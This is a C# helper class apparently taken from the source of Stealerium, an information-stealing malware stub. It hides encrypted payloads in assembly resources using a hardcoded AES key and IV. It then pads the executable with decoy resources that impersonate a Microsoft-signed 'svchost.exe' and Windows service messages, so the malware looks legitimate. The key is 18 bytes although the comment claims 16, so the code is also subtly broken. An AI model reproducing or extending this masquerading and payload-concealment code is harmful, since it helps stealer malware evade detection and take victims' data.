using System;
using System.IO;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Drawing;
using System.Reflection;
using System.Collections.Generic;

namespace Stealerium.Stub.Helpers
{
    internal sealed class ResourceManager
    {
        private static readonly byte[] Key = Encoding.UTF8.GetBytes("St3al3r1umR3s0urc3"); // 16 bytes key
        private static readonly byte[] IV = Encoding.UTF8.GetBytes("R3s0urc3M4n4g3r!"); // 16 bytes IV

        private static readonly Dictionary<string, string> SystemMessages = new Dictionary<string, string>
        {
            { "SVC_START", "Windows service started successfully" },
            { "SVC_STOP", "Windows service stopped" },
            { "SVC_PAUSE", "Service paused" },
            { "SVC_RESUME", "Service resumed" },
            { "SVC_ERROR", "Service encountered an error" },
            { "NET_CONNECT", "Network connection established" },
            { "NET_DISCONNECT", "Network connection lost" },
            { "UPDATE_CHECK", "Checking for Windows updates..." },
            { "UPDATE_FOUND", "New updates available" },
            { "UPDATE_NONE", "Your system is up to date" },
            { "SEC_SCAN", "Security scan in progress" },
            { "SEC_THREAT", "Potential security threat detected" },
            { "SEC_CLEAN", "No security threats found" },
            { "BACKUP_START", "System backup started" },
            { "BACKUP_END", "System backup completed" }
        };

        private static readonly Dictionary<string, string> ErrorMessages = new Dictionary<string, string>
        {
            { "ERR_CONFIG", "Unable to load system configuration" },
            { "ERR_PERM", "Access denied. Required privileges not found" },
            { "ERR_NET", "Network connection error" },
            { "ERR_RES", "System resources unavailable" },
            { "ERR_REG", "Registry access error" },
            { "ERR_DRV", "Driver initialization failed" },
            { "ERR_API", "Windows API call failed" },
            { "ERR_SVC", "Service failed to respond" },
            { "ERR_MEM", "Insufficient memory" },
            { "ERR_IO", "I/O operation failed" }
        };

        // Embed data into resources with encryption
        public static void EmbedResource(string resourceName, byte[] data)
        {
            try
            {
                using (var aes = Aes.Create())
                {
                    aes.Key = Key;
                    aes.IV = IV;
                    aes.Padding = PaddingMode.PKCS7;
                    aes.Mode = CipherMode.CBC;

                    using (var encryptor = aes.CreateEncryptor())
                    using (var msEncrypt = new MemoryStream())
                    {
                        using (var csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                        using (var swEncrypt = new BinaryWriter(csEncrypt))
                        {
                            swEncrypt.Write(data);
                        }

                        var assembly = Assembly.GetExecutingAssembly();
                        using (var resourceWriter = new ResourceWriter(assembly.Location + ".resources"))
                        {
                            // Add the encrypted data
                            resourceWriter.AddResource(resourceName, msEncrypt.ToArray());

                            // Add system messages as decoys
                            foreach (var msg in SystemMessages)
                            {
                                resourceWriter.AddResource($"SYS_{msg.Key}", msg.Value);
                            }

                            // Add error messages as decoys
                            foreach (var err in ErrorMessages)
                            {
                                resourceWriter.AddResource($"ERR_{err.Key}", err.Value);
                            }

                            resourceWriter.Generate();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"ResourceManager > Failed to embed resource: {resourceName}\n{ex}");
            }
        }

        // Extract and decrypt data from resources
        public static byte[] ExtractResource(string resourceName)
        {
            try
            {
                var assembly = Assembly.GetExecutingAssembly();
                using (var stream = assembly.GetManifestResourceStream(resourceName))
                {
                    if (stream == null) return null;

                    using (var aes = Aes.Create())
                    {
                        aes.Key = Key;
                        aes.IV = IV;
                        aes.Padding = PaddingMode.PKCS7;
                        aes.Mode = CipherMode.CBC;

                        using (var decryptor = aes.CreateDecryptor())
                        using (var msDecrypt = new MemoryStream())
                        {
                            using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Write))
                            using (var swDecrypt = new BinaryWriter(csDecrypt))
                            {
                                var buffer = new byte[stream.Length];
                                stream.Read(buffer, 0, buffer.Length);
                                swDecrypt.Write(buffer);
                            }

                            return msDecrypt.ToArray();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"ResourceManager > Failed to extract resource: {resourceName}\n{ex}");
                return null;
            }
        }

        // Add decoy resources to make the executable look legitimate
        public static void AddDecoyResources()
        {
            try
            {
                var assembly = Assembly.GetExecutingAssembly();
                using (var resourceWriter = new ResourceWriter(assembly.Location + ".resources"))
                {
                    // Add Windows version info
                    resourceWriter.AddResource("ProductVersion", "10.0.19045.3803");
                    resourceWriter.AddResource("CompanyName", "Microsoft Corporation");
                    resourceWriter.AddResource("ProductName", "Microsoft® Windows® Operating System");
                    resourceWriter.AddResource("LegalCopyright", "© Microsoft Corporation. All rights reserved.");
                    resourceWriter.AddResource("FileDescription", "Windows System Component");
                    resourceWriter.AddResource("OriginalFilename", "svchost.exe");
                    resourceWriter.AddResource("InternalName", "System Service Host");
                    resourceWriter.AddResource("Comments", "Windows System Component");
                    resourceWriter.AddResource("BuildVersion", "3803");
                    resourceWriter.AddResource("PrivateBuild", "19045");

                    // Add all system messages
                    foreach (var msg in SystemMessages)
                    {
                        resourceWriter.AddResource($"SYS_{msg.Key}", msg.Value);
                    }

                    // Add all error messages
                    foreach (var err in ErrorMessages)
                    {
                        resourceWriter.AddResource($"ERR_{err.Key}", err.Value);
                    }

                    resourceWriter.Generate();
                }
            }
            catch (Exception ex)
            {
                Logging.Log($"ResourceManager > Failed to add decoy resources\n{ex}");
            }
        }
    }
}
